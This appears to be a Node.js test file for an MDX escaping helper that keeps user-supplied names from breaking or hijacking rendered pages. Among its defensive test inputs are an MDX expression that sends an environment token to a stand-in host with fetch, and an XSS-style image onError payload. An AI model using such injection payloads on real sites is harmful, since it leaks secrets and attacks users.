import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { escapeMdx, escapeMdxInline } from "../../scripts/lib/mdx-escape.js";

describe("escapeMdxInline", () => {
    it("blocks MDX expressions and JSX", () => {
        const out = escapeMdxInline('{(fetch("https://x.example/"+process.env.TOKEN),"")}');
        assert.ok(!out.includes("{") && !out.includes("}"), out);
        assert.equal(escapeMdxInline("<img src=x onError={alert(1)} />").includes("<"), false);
        assert.equal(escapeMdxInline("a > b"), "a &gt; b");
    });

    it("keeps a table cell in one column", () => {
        assert.equal(escapeMdxInline("NMR | Tom Baldwin"), "NMR \\| Tom Baldwin");
    });

    it("stops links, images and emphasis", () => {
        assert.equal(escapeMdxInline("[win](https://x.example)"), "\\[win\\](https://x.example)");
        assert.equal(
            escapeMdxInline("![](https://x.example/t.png)"),
            "\\!\\[\\](https://x.example/t.png)",
        );
        assert.equal(escapeMdxInline("Wb_vg *star*"), "Wb\\_vg \\*star\\*");
    });

    it("keeps text on one line", () => {
        assert.equal(escapeMdxInline("Spooky Cup\n\n# Owned"), "Spooky Cup \\# Owned");
        assert.equal(escapeMdxInline("a\r\nb"), "a b");
    });

    it("escapes backslashes and ampersands first, so they render literally", () => {
        assert.equal(escapeMdxInline("a\\{b"), "a\\\\&#123;b");
        assert.equal(escapeMdxInline("&lt;"), "&amp;lt;");
    });

    it("leaves ordinary names alone", () => {
        for (const name of [
            "Maddo's Cup #13 — 100€ for the Winner",
            "🍋Sitrus-Series🍋",
            "Farfetch’d",
            "Mr. Mime",
            "Flabébé",
        ]) {
            const out = escapeMdxInline(name);
            // Only `#` is escaped in these; nothing else changes.
            assert.equal(out.replace(/\\#/g, "#"), name);
        }
    });
});

describe("escapeMdx", () => {
    it("stops lines that MDX would read as import/export statements", () => {
        assert.equal(
            escapeMdx("import x from 'y'\nexport const a = 1\n  export default 1"),
            "&#105;mport x from 'y'\n&#101;xport const a = 1\n  &#101;xport default 1",
        );
        assert.equal(escapeMdx("We import data. Exports rose."), "We import data. Exports rose.");
    });

    it("blocks JSX and expressions but keeps Markdown formatting", () => {
        assert.equal(
            escapeMdx("**Bold** [link](/x) <b>{x}</b>"),
            "**Bold** [link](/x) &lt;b>&#123;x&#125;&lt;/b>",
        );
    });
});
